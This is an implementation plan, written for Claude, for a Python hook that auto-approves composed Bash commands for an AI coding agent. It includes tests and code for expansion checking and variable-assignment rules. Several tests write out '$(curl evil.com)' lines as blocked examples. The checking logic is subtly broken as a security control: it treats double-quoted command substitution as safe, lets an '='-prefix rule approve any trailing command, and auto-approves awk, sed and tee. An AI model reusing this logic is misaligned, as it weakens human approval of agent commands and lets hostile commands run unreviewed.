# Smart Compose v2 Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Enhance smart-compose hook to auto-approve variable assignments and commands with safe expansions.

**Architecture:** Three changes to the existing hook: (1) expand TRUSTED_BUILTINS with 19 coreutils, (2) add expansion extraction and recursive checking so `$(cmd)` is approved when `cmd` matches allow rules, (3) add variable assignment recognition so `VAR=value && cmd` is approved when `VAR=` matches a prefix rule and the value's expansions are safe. Also fix a word boundary bug where `=`-ending prefixes don't match.

**Tech Stack:** Python 3.6+, pytest, no external dependencies

**Design doc:** `docs/plans/2026-02-23-smart-compose-v2-design.md`

---

### Task 1: Expand TRUSTED_BUILTINS

**Files:**
- Modify: `hooks/smart-compose.py:15`
- Modify: `tests/test_smart_compose.py` (TestIsAutoAllowedBuiltin)

**Step 1: Write failing tests for new builtins**

Append to `TestIsAutoAllowedBuiltin` in `tests/test_smart_compose.py`:

```python
    # --- New builtins (v2) ---

    def test_cp(self):
        assert sc.is_auto_allowed_builtin("cp file1 file2") is True

    def test_mv(self):
        assert sc.is_auto_allowed_builtin("mv old new") is True

    def test_mkdir(self):
        assert sc.is_auto_allowed_builtin("mkdir -p /tmp/test") is True

    def test_touch(self):
        assert sc.is_auto_allowed_builtin("touch file.txt") is True

    def test_cat(self):
        assert sc.is_auto_allowed_builtin("cat file.txt") is True

    def test_head(self):
        assert sc.is_auto_allowed_builtin("head -5 file.txt") is True

    def test_tail(self):
        assert sc.is_auto_allowed_builtin("tail -f log.txt") is True

    def test_wc(self):
        assert sc.is_auto_allowed_builtin("wc -l file.txt") is True

    def test_less(self):
        assert sc.is_auto_allowed_builtin("less file.txt") is True

    def test_awk(self):
        assert sc.is_auto_allowed_builtin("awk '{print $1}' file") is True

    def test_sed(self):
        assert sc.is_auto_allowed_builtin("sed 's/old/new/' file") is True

    def test_grep(self):
        assert sc.is_auto_allowed_builtin("grep -r pattern dir") is True

    def test_sort(self):
        assert sc.is_auto_allowed_builtin("sort file.txt") is True

    def test_uniq(self):
        assert sc.is_auto_allowed_builtin("uniq -c file.txt") is True

    def test_tee(self):
        assert sc.is_auto_allowed_builtin("tee output.txt") is True

    def test_basename(self):
        assert sc.is_auto_allowed_builtin("basename /path/to/file") is True

    def test_dirname(self):
        assert sc.is_auto_allowed_builtin("dirname /path/to/file") is True

    def test_realpath(self):
        assert sc.is_auto_allowed_builtin("realpath ./relative") is True

    def test_date(self):
        assert sc.is_auto_allowed_builtin("date +%Y-%m-%d") is True

    def test_sleep(self):
        assert sc.is_auto_allowed_builtin("sleep 1") is True
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsAutoAllowedBuiltin::test_cp tests/test_smart_compose.py::TestIsAutoAllowedBuiltin::test_mv tests/test_smart_compose.py::TestIsAutoAllowedBuiltin::test_mkdir -v`
Expected: FAIL — `assert False is True`

**Step 3: Expand TRUSTED_BUILTINS**

In `hooks/smart-compose.py`, replace line 15:

```python
TRUSTED_BUILTINS = frozenset({
    "cd", "echo", "printf", "true", "false", "test", "[", "[[",
    # v2: coreutils
    "cp", "mv", "mkdir", "touch",
    "cat", "head", "tail", "wc", "less",
    "awk", "sed", "grep", "sort", "uniq", "tee",
    "basename", "dirname", "realpath",
    "date", "sleep",
})
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsAutoAllowedBuiltin -v`
Expected: all PASSED

**Step 5: Run full suite to check no regressions**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 6: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Expand TRUSTED_BUILTINS with 19 coreutils"
```

---

### Task 2: Expansion extraction helpers

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `_find_matching_close` and `extract_expansions`**

Add new test classes to `tests/test_smart_compose.py`:

```python
class TestFindMatchingClose:
    """Tests for the paren/brace matching helper."""

    def test_simple_parens(self):
        # "( a b )" — open at 0, close at 5
        assert sc._find_matching_close("(ab)", 0, "(", ")") == 3

    def test_nested_parens(self):
        # "(a(b)c)" — open at 0, inner at 2-4, close at 6
        assert sc._find_matching_close("(a(b)c)", 0, "(", ")") == 6

    def test_parens_with_single_quotes(self):
        # "(a')'b)" — quote at 2 opens, quote at 4 closes, ) at 6 matches
        assert sc._find_matching_close("(a')'b)", 0, "(", ")") == 6

    def test_parens_with_double_quotes(self):
        assert sc._find_matching_close('(a")"b)', 0, "(", ")") == 6

    def test_parens_with_escaped_close(self):
        # "(a\)b)" — \) is escape pair, ) at 5 matches
        assert sc._find_matching_close("(a\\)b)", 0, "(", ")") == 5

    def test_unmatched(self):
        assert sc._find_matching_close("(abc", 0, "(", ")") == -1

    def test_braces(self):
        assert sc._find_matching_close("{abc}", 0, "{", "}") == 4

    def test_nested_braces(self):
        assert sc._find_matching_close("{a{b}c}", 0, "{", "}") == 6

    def test_empty_content(self):
        assert sc._find_matching_close("()", 0, "(", ")") == 1


class TestExtractExpansions:
    """Tests for extracting $(cmd), `cmd`, ${var}, <(cmd), >(cmd)."""

    def test_dollar_paren(self):
        result = sc.extract_expansions("$(git status)")
        assert result == [("cmd", "git status")]

    def test_dollar_brace(self):
        result = sc.extract_expansions("${PATH}")
        assert result == [("var", "PATH")]

    def test_backtick(self):
        result = sc.extract_expansions("`whoami`")
        assert result == [("cmd", "whoami")]

    def test_process_sub_in(self):
        result = sc.extract_expansions("<(cat file)")
        assert result == [("cmd", "cat file")]

    def test_process_sub_out(self):
        result = sc.extract_expansions(">(tee file)")
        assert result == [("cmd", "tee file")]

    def test_nested_dollar_paren(self):
        result = sc.extract_expansions("$(echo $(date))")
        assert result == [("cmd", "echo $(date)")]

    def test_multiple_expansions(self):
        result = sc.extract_expansions("$(git log) and ${HOME}")
        assert result == [("cmd", "git log"), ("var", "HOME")]

    def test_no_expansions(self):
        result = sc.extract_expansions("echo hello world")
        assert result == []

    def test_dollar_paren_in_double_quotes(self):
        result = sc.extract_expansions('"$(date)"')
        assert result == []  # inside quotes, not extracted

    def test_dollar_paren_in_single_quotes(self):
        result = sc.extract_expansions("'$(date)'")
        assert result == []

    def test_plain_dollar_var(self):
        # $HOME is not $( or ${, so not extracted
        result = sc.extract_expansions("$HOME")
        assert result == []

    def test_dollar_brace_complex(self):
        result = sc.extract_expansions("${var:-default}")
        assert result == [("var", "var:-default")]

    def test_unmatched_dollar_paren(self):
        # $(unclosed — no match found
        result = sc.extract_expansions("$(unclosed")
        assert result == []

    def test_mixed_quoted_and_unquoted(self):
        result = sc.extract_expansions('$(git log) "$(safe)" $(git status)')
        assert result == [("cmd", "git log"), ("cmd", "git status")]
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestFindMatchingClose tests/test_smart_compose.py::TestExtractExpansions -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `_find_matching_close` and `extract_expansions`**

Add to `hooks/smart-compose.py` after `has_unquoted_expansion`:

```python
def _find_matching_close(text, start, open_char, close_char):
    """Find matching close character, respecting quotes and nesting.
    start is the position of the opening character.
    Returns position of closing character, or -1 if not found.
    """
    depth = 1
    i = start + 1
    in_single = False
    in_double = False

    while i < len(text):
        c = text[i]

        if in_single:
            if c == "'":
                in_single = False
            i += 1
            continue

        if in_double:
            if c == "\\":
                i += 2
                continue
            if c == '"':
                in_double = False
            i += 1
            continue

        if c == "\\":
            i += 2
            continue

        if c == "'":
            in_single = True
            i += 1
            continue

        if c == '"':
            in_double = True
            i += 1
            continue

        if c == open_char:
            depth += 1
        elif c == close_char:
            depth -= 1
            if depth == 0:
                return i

        i += 1

    return -1


def extract_expansions(text):
    """Extract unquoted expansions from text.
    Returns list of (type, content) where type is "cmd" or "var".
    """
    results = []
    outside = _outside_quote_positions(text)
    i = 0

    while i < len(text):
        if i not in outside:
            i += 1
            continue

        c = text[i]

        if c == "$" and i + 1 < len(text) and (i + 1) in outside:
            next_c = text[i + 1]
            if next_c == "(":
                end = _find_matching_close(text, i + 1, "(", ")")
                if end != -1:
                    results.append(("cmd", text[i + 2:end]))
                    i = end + 1
                    continue
            elif next_c == "{":
                end = _find_matching_close(text, i + 1, "{", "}")
                if end != -1:
                    results.append(("var", text[i + 2:end]))
                    i = end + 1
                    continue

        if c == "`":
            j = i + 1
            found = False
            while j < len(text):
                if j in outside and text[j] == "`":
                    results.append(("cmd", text[i + 1:j]))
                    i = j + 1
                    found = True
                    break
                j += 1
            if found:
                continue
            i += 1
            continue

        if c in ("<", ">") and i + 1 < len(text) and (i + 1) in outside and text[i + 1] == "(":
            end = _find_matching_close(text, i + 1, "(", ")")
            if end != -1:
                results.append(("cmd", text[i + 2:end]))
                i = end + 1
                continue

        i += 1

    return results
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestFindMatchingClose tests/test_smart_compose.py::TestExtractExpansions -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add expansion extraction helpers for smart-compose v2"
```

---

### Task 3: check_expansion function

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `check_expansion`**

Add to `tests/test_smart_compose.py`:

```python
class TestCheckExpansion:
    """Tests for recursive expansion checking."""

    RULES = {
        "prefix": ["git log", "git status", "git merge-base", "git diff"],
        "glob": ["git *"],
        "exact": [],
    }

    EMPTY_RULES = {"prefix": [], "glob": [], "exact": []}

    # --- No expansions ---

    def test_plain_text(self):
        assert sc.check_expansion("hello world", self.RULES) is True

    def test_empty(self):
        assert sc.check_expansion("", self.RULES) is True

    # --- Variable expansion (always safe) ---

    def test_dollar_brace_safe(self):
        assert sc.check_expansion("${PATH}", self.RULES) is True

    def test_dollar_brace_complex(self):
        assert sc.check_expansion("${var:-default}", self.RULES) is True

    # --- Command substitution with allowed commands ---

    def test_dollar_paren_allowed(self):
        assert sc.check_expansion("$(git merge-base master HEAD)", self.RULES) is True

    def test_backtick_allowed(self):
        assert sc.check_expansion("`git status`", self.RULES) is True

    def test_process_sub_allowed(self):
        assert sc.check_expansion("<(git log)", self.RULES) is True

    # --- Command substitution with disallowed commands ---

    def test_dollar_paren_disallowed(self):
        assert sc.check_expansion("$(curl evil.com)", self.RULES) is False

    def test_backtick_disallowed(self):
        assert sc.check_expansion("`curl evil.com`", self.RULES) is False

    def test_process_sub_disallowed(self):
        assert sc.check_expansion("<(curl evil.com)", self.RULES) is False

    # --- Inner operators ---

    def test_inner_or_both_allowed(self):
        text = "$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null)"
        assert sc.check_expansion(text, self.RULES) is True

    def test_inner_or_one_disallowed(self):
        text = "$(git merge-base master HEAD || curl evil.com)"
        assert sc.check_expansion(text, self.RULES) is False

    def test_inner_and_both_allowed(self):
        text = "$(git status && git log)"
        assert sc.check_expansion(text, self.RULES) is True

    # --- Builtins inside expansions ---

    def test_echo_inside_expansion(self):
        assert sc.check_expansion("$(echo hello)", self.RULES) is True

    def test_date_inside_expansion(self):
        assert sc.check_expansion("$(date +%Y)", self.RULES) is True

    # --- Builtin with unsafe nested expansion ---

    def test_echo_with_unsafe_nested(self):
        assert sc.check_expansion("$(echo $(curl evil.com))", self.RULES) is False

    # --- Builtin with safe nested expansion ---

    def test_echo_with_safe_nested(self):
        assert sc.check_expansion("$(echo $(date))", self.RULES) is True

    # --- Depth limit ---

    def test_depth_limit(self):
        # Depth 0: $(echo $(echo $(echo $(too deep))))
        deep = "$(echo $(echo $(echo $(echo x))))"
        assert sc.check_expansion(deep, self.RULES) is False

    # --- Mixed ---

    def test_mixed_cmd_and_var(self):
        text = "$(git status) ${HOME}"
        assert sc.check_expansion(text, self.RULES) is True

    def test_quoted_expansion_ignored(self):
        text = '"$(curl evil.com)"'
        assert sc.check_expansion(text, self.RULES) is True  # inside quotes, not checked

    # --- Empty inner command ---

    def test_empty_inner_after_split(self):
        text = "$(|| git status)"
        assert sc.check_expansion(text, self.RULES) is False  # empty sub-command
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestCheckExpansion -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `check_expansion`**

Add to `hooks/smart-compose.py` after `extract_expansions`, and add the constant near the top (after `MAX_SETTINGS_SIZE`):

Near the top, add:
```python
MAX_EXPANSION_DEPTH = 3
```

After `extract_expansions`, add:

```python
def check_expansion(text, rules, depth=0):
    """Check if all unquoted expansions in text contain allowed commands.
    Returns True if safe, False if any expansion contains an unrecognized command.
    """
    if depth > MAX_EXPANSION_DEPTH:
        _debug(f"expansion depth limit reached ({depth})")
        return False

    expansions = extract_expansions(text)

    for exp_type, content in expansions:
        if exp_type == "var":
            continue  # ${VAR} is safe — no command execution

        # Command expansion — split inner command on operators and check each part
        inner_parts = split_on_operators(content)

        for part in inner_parts:
            stripped = part.strip()
            if not stripped:
                _debug(f"expansion: empty inner sub-command")
                return False

            # Check against allow rules
            if matches_any_rule(stripped, rules):
                continue

            # Check if it's a trusted builtin
            words = stripped.split(None, 1)
            name = words[0]
            if name in TRUSTED_BUILTINS:
                # Recursively check the builtin's args for expansions
                args = words[1] if len(words) > 1 else ""
                if not check_expansion(args, rules, depth + 1):
                    _debug(f'expansion: builtin "{name}" has unsafe nested expansion')
                    return False
                continue

            _debug(f'expansion: "{stripped}" not allowed')
            return False

    return True
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestCheckExpansion -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add recursive expansion checking for smart-compose v2"
```

---

### Task 4: Fix word boundary in matches_any_rule for = prefixes

**Files:**
- Modify: `hooks/smart-compose.py:222-223`
- Modify: `tests/test_smart_compose.py` (TestMatchesAnyRule)

**Step 1: Write failing tests for = prefix matching**

Add to `TestMatchesAnyRule` in `tests/test_smart_compose.py`. First update the RULES fixture to include `=`-ending prefixes:

```python
class TestMatchesAnyRule:

    RULES = {
        "prefix": ["git log", "git status", "git add", "git commit", "git diff", "npm run", "node",
                    "MERGE_BASE=", "GIT_AUTHOR_DATE="],
        "glob": ["git *"],
        "exact": ['git commit -m "fix"', "git log | head -5"],
    }
```

Then add tests:

```python
    # --- Equals-ending prefix match ---

    def test_var_assign_literal(self):
        """MERGE_BASE=:* must match MERGE_BASE=abc123."""
        assert sc.matches_any_rule("MERGE_BASE=abc123", self.RULES) is True

    def test_var_assign_with_expansion(self):
        """MERGE_BASE=:* must match MERGE_BASE=$(...)."""
        assert sc.matches_any_rule("MERGE_BASE=$(git merge-base master HEAD)", self.RULES) is True

    def test_var_assign_empty_value(self):
        """MERGE_BASE=:* must match MERGE_BASE= (empty value)."""
        assert sc.matches_any_rule("MERGE_BASE=", self.RULES) is True

    def test_var_assign_with_space_value(self):
        """GIT_AUTHOR_DATE=:* must match GIT_AUTHOR_DATE=2026-01-01 git commit."""
        assert sc.matches_any_rule('GIT_AUTHOR_DATE="2026-01-01" git commit -m "msg"', self.RULES) is True

    def test_var_assign_no_match(self):
        """UNKNOWN= should not match any rule."""
        assert sc.matches_any_rule("UNKNOWN=abc123", self.RULES) is False
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestMatchesAnyRule::test_var_assign_literal tests/test_smart_compose.py::TestMatchesAnyRule::test_var_assign_with_expansion tests/test_smart_compose.py::TestMatchesAnyRule::test_var_assign_empty_value -v`
Expected: FAIL — `assert False is True`

**Step 3: Fix word boundary check**

In `hooks/smart-compose.py`, in the `matches_any_rule` function, update the prefix matching condition:

Replace:
```python
            if len(cmd) == len(prefix) or cmd[len(prefix)] in (" ", "\t"):
```

With:
```python
            if len(cmd) == len(prefix) or cmd[len(prefix)] in (" ", "\t") or prefix.endswith("="):
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestMatchesAnyRule -v`
Expected: all PASSED

**Step 5: Run full suite to check no regressions**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 6: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "fix: Allow = as word boundary in prefix matching"
```

---

### Task 5: Variable assignment recognition

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `is_variable_assignment`**

Add to `tests/test_smart_compose.py`:

```python
class TestIsVariableAssignment:
    """Tests for variable assignment recognition with expansion checking."""

    RULES = {
        "prefix": ["MERGE_BASE=", "BRANCH=", "GIT_AUTHOR_DATE=", "git merge-base", "git log"],
        "glob": ["git *"],
        "exact": [],
    }

    EMPTY_RULES = {"prefix": [], "glob": [], "exact": []}

    # --- Basic recognition ---

    def test_simple_assignment(self):
        assert sc.is_variable_assignment("MERGE_BASE=abc123", self.RULES) is True

    def test_assignment_with_hash(self):
        assert sc.is_variable_assignment("MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c", self.RULES) is True

    def test_empty_value(self):
        assert sc.is_variable_assignment("MERGE_BASE=", self.RULES) is True

    def test_underscore_var(self):
        assert sc.is_variable_assignment("_VAR=value", self.EMPTY_RULES) is False  # no rule

    # --- Requires allow rule ---

    def test_no_matching_rule(self):
        assert sc.is_variable_assignment("UNKNOWN=abc123", self.RULES) is False

    def test_no_rules_at_all(self):
        assert sc.is_variable_assignment("MERGE_BASE=abc123", self.EMPTY_RULES) is False

    # --- Not variable assignments ---

    def test_not_assignment(self):
        assert sc.is_variable_assignment("git log --oneline", self.RULES) is False

    def test_equals_in_args(self):
        assert sc.is_variable_assignment("git log --format=%H", self.RULES) is False

    def test_starts_with_digit(self):
        assert sc.is_variable_assignment("1VAR=value", self.RULES) is False

    def test_empty(self):
        assert sc.is_variable_assignment("", self.RULES) is False

    # --- Expansion checking ---

    def test_safe_command_expansion(self):
        assert sc.is_variable_assignment("MERGE_BASE=$(git merge-base master HEAD)", self.RULES) is True

    def test_unsafe_command_expansion(self):
        assert sc.is_variable_assignment("MERGE_BASE=$(curl evil.com)", self.RULES) is False

    def test_safe_or_expansion(self):
        text = "MERGE_BASE=$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null)"
        assert sc.is_variable_assignment(text, self.RULES) is True

    def test_variable_expansion_safe(self):
        assert sc.is_variable_assignment("BRANCH=${BRANCH_NAME}", self.RULES) is True

    def test_backtick_expansion_allowed(self):
        assert sc.is_variable_assignment("MERGE_BASE=`git merge-base master HEAD`", self.RULES) is True

    def test_backtick_expansion_disallowed(self):
        assert sc.is_variable_assignment("MERGE_BASE=`curl evil.com`", self.RULES) is False

    # --- Leading whitespace ---

    def test_leading_whitespace(self):
        assert sc.is_variable_assignment("  MERGE_BASE=abc123", self.RULES) is True
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsVariableAssignment -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `is_variable_assignment`**

Add `import re` at the top of `hooks/smart-compose.py` (after `from fnmatch import fnmatch`).

Add constant after `MAX_EXPANSION_DEPTH`:
```python
_VAR_ASSIGN_RE = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*=')
```

Add function after `check_expansion`:

```python
def is_variable_assignment(subcmd, rules):
    """Check if sub-command is a variable assignment with safe expansions."""
    cmd = subcmd.strip()
    if not cmd:
        return False

    if not _VAR_ASSIGN_RE.match(cmd):
        return False

    # Check full text against allow rules (needs = word boundary fix from Task 4)
    if not matches_any_rule(cmd, rules):
        _debug(f'var assignment: "{cmd}" not in allow rules')
        return False

    # Extract value and check for safe expansions
    eq_pos = cmd.index("=")
    value = cmd[eq_pos + 1:]

    if not check_expansion(value, rules):
        _debug(f'var assignment: "{cmd}" value has unsafe expansion')
        return False

    _debug(f'var assignment: "{cmd}" -> allowed')
    return True
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsVariableAssignment -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add variable assignment recognition with expansion checking"
```

---

### Task 6: Update is_auto_allowed_builtin and check_command

**Files:**
- Modify: `hooks/smart-compose.py` (`is_auto_allowed_builtin`, `check_command`)
- Modify: `tests/test_smart_compose.py` (update existing tests for behavior changes)

**Step 1: Update `is_auto_allowed_builtin` signature and logic**

In `hooks/smart-compose.py`, replace the `is_auto_allowed_builtin` function:

```python
def is_auto_allowed_builtin(subcmd, rules=None):
    """Check if sub-command is an auto-allowed builtin with safe expansions."""
    cmd = subcmd.strip()
    if not cmd:
        return False

    parts = cmd.split(None, 1)
    name = parts[0]

    if name not in TRUSTED_BUILTINS:
        return False

    args = parts[1] if len(parts) > 1 else ""

    if rules is not None:
        # v2: recursive expansion checking
        if not check_expansion(args, rules):
            _debug(f'sub-cmd: "{cmd}" -> builtin "{name}" blocked by expansion guard')
            return False
    else:
        # Fallback: blanket expansion block (no rules available)
        if has_unquoted_expansion(args):
            _debug(f'sub-cmd: "{cmd}" -> builtin "{name}" blocked by expansion guard')
            return False

    _debug(f'sub-cmd: "{cmd}" -> builtin:"{name}"')
    return True
```

**Step 2: Update `check_command` to use new functions**

In `hooks/smart-compose.py`, replace the sub-command checking loop in `check_command`:

Replace:
```python
    # Check each sub-command
    for part in parts:
        stripped = part.strip()
        if not stripped:
            _debug("passthrough: empty sub-command")
            return None

        if not is_auto_allowed_builtin(stripped) and not matches_any_rule(stripped, rules):
            _debug(f'passthrough: unmatched sub-command "{stripped}"')
            return None

    return "allow"
```

With:
```python
    # Check each sub-command
    for part in parts:
        stripped = part.strip()
        if not stripped:
            _debug("passthrough: empty sub-command")
            return None

        # Variable assignments get special handling with expansion checking
        if _VAR_ASSIGN_RE.match(stripped):
            if not is_variable_assignment(stripped, rules):
                _debug(f'passthrough: unsafe variable assignment "{stripped}"')
                return None
            continue

        if is_auto_allowed_builtin(stripped, rules):
            continue

        if matches_any_rule(stripped, rules):
            continue

        _debug(f'passthrough: unmatched sub-command "{stripped}"')
        return None

    return "allow"
```

**Step 3: Update existing tests for behavior changes**

In `TestIsAutoAllowedBuiltin`, update `test_echo_dollar_brace` — `${PATH}` is now safe (variable expansion, not command execution):

```python
    def test_echo_dollar_brace(self):
        # v2: ${VAR} is variable expansion, not command execution — safe
        assert sc.is_auto_allowed_builtin("echo ${PATH}") is True
```

In `TestCheckCommand`, update `test_echo_dollar_brace_blocked` — now allowed:

```python
    def test_echo_dollar_brace_allowed(self):
        # v2: ${VAR} is variable expansion — safe for builtins
        result = sc.check_command("echo ${PATH} && git status", self.project, self.home)
        assert result == "allow"
```

**Step 4: Run full test suite**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Wire up variable assignments and recursive expansion in check_command"
```

---

### Task 7: End-to-end integration tests for target commands

**Files:**
- Modify: `tests/test_smart_compose.py`

**Step 1: Add integration tests for all target commands**

Add to `TestCheckCommand`. First update the fixture to include variable assignment rules:

In `setup_rules`, update the `project_rules`:

```python
    @pytest.fixture(autouse=True)
    def setup_rules(self, tmp_path):
        """Create a project dir with standard test rules."""
        self.project = str(tmp_path / "project")
        self.home = str(tmp_path / "home")
        os.makedirs(os.path.join(self.project, ".claude"), exist_ok=True)
        os.makedirs(os.path.join(self.home, ".claude"), exist_ok=True)

        project_rules = {
            "permissions": {
                "allow": [
                    "Bash(git log:*)",
                    "Bash(git status:*)",
                    "Bash(git add:*)",
                    "Bash(git commit:*)",
                    "Bash(git diff:*)",
                    "Bash(git pull:*)",
                    "Bash(git merge-base:*)",
                    "Bash(npm run:*)",
                    "Bash(git *)",
                    "Bash(MERGE_BASE=:*)",
                ]
            }
        }
        with open(os.path.join(self.project, ".claude", "settings.local.json"), "w") as f:
            json.dump(project_rules, f)
```

Then add the target command tests:

```python
    # --- v2: Variable assignment integration ---

    def test_target_merge_base_literal_and_log(self):
        """Target command #3: MERGE_BASE=hash && git log ..."""
        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git log "$MERGE_BASE"..HEAD --format="%h %s" --reverse'
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_target_merge_base_literal_and_diff(self):
        """Target command #4: MERGE_BASE=hash && git diff ..."""
        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git diff --name-only "$MERGE_BASE"..HEAD'
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_target_merge_base_literal_and_log_with_date(self):
        """Target command #5: MERGE_BASE=hash && git log with date format"""
        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git log "$MERGE_BASE"..HEAD --format="%h %s (%ai)" --reverse'
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_target_merge_base_expansion_and_diff(self):
        """Target command #1: MERGE_BASE=$(git merge-base master HEAD) && git diff ..."""
        cmd = 'MERGE_BASE=$(git merge-base master HEAD) && git diff --name-only "$MERGE_BASE"..HEAD'
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_target_merge_base_expansion_fallback_and_echo(self):
        """Target command #2: MERGE_BASE=$(... || ...) && echo ..."""
        cmd = 'MERGE_BASE=$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null) && echo "$MERGE_BASE"'
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    # --- v2: Variable assignment security ---

    def test_var_assign_unsafe_expansion(self):
        cmd = "MERGE_BASE=$(curl evil.com) && git log"
        assert sc.check_command(cmd, self.project, self.home) is None

    def test_var_assign_no_rule(self):
        cmd = "UNKNOWN=abc123 && git log"
        assert sc.check_command(cmd, self.project, self.home) is None

    # --- v2: Builtin with allowed expansion ---

    def test_echo_with_allowed_expansion(self):
        cmd = "echo $(git status) && git log"
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_echo_with_disallowed_expansion(self):
        cmd = "echo $(curl evil.com) && git log"
        assert sc.check_command(cmd, self.project, self.home) is None

    # --- v2: New builtins in composed commands ---

    def test_cp_and_git(self):
        cmd = "cp file1 file2 && git add file1"
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_mkdir_and_cp_and_git(self):
        cmd = "mkdir -p /tmp/test && cp file /tmp/test/ && git status"
        assert sc.check_command(cmd, self.project, self.home) == "allow"

    def test_wc_and_echo(self):
        cmd = "wc -l file.txt && echo done"
        assert sc.check_command(cmd, self.project, self.home) == "allow"
```

**Step 2: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestCheckCommand -v`
Expected: all PASSED

**Step 3: Add hook integration tests for target commands**

Add to `TestHookIntegration`:

```python
    def test_var_assign_composed(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(MERGE_BASE=:*)", "Bash(git log:*)", "Bash(git merge-base:*)", "Bash(git *)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": 'MERGE_BASE=$(git merge-base master HEAD) && git log "$MERGE_BASE"..HEAD --format="%h %s" --reverse'},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        output = json.loads(result.stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"

    def test_var_assign_unsafe_blocked(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(MERGE_BASE=:*)", "Bash(git log:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "MERGE_BASE=$(curl evil.com) && git log"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        assert result.stdout.strip() == ""  # passthrough, not approved
```

**Step 4: Run full test suite**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add tests/test_smart_compose.py
git commit -m "test: Add end-to-end tests for smart-compose v2 target commands"
```

---

### Task 8: Documentation update

**Files:**
- Modify: `CLAUDE.md`

**Step 1: Update Smart Compose section in CLAUDE.md**

Under the existing Smart Compose Hook section, add a note about v2 capabilities:

```markdown
### Smart Compose Hook

The `smart-compose` hook (`hooks/smart-compose.py`) auto-approves composed Bash commands where every sub-command individually matches an existing allow rule. It splits on `&&`, `||`, `;` outside quotes, checks each part against prefix/glob/exact rules and builtins, and passes through to the normal permission system if any part is unrecognized.

- Installed to: `~/.claude/hooks/smart-compose.py` (symlink)
- Registered in: `~/.claude/settings.json` under `hooks.PreToolUse`
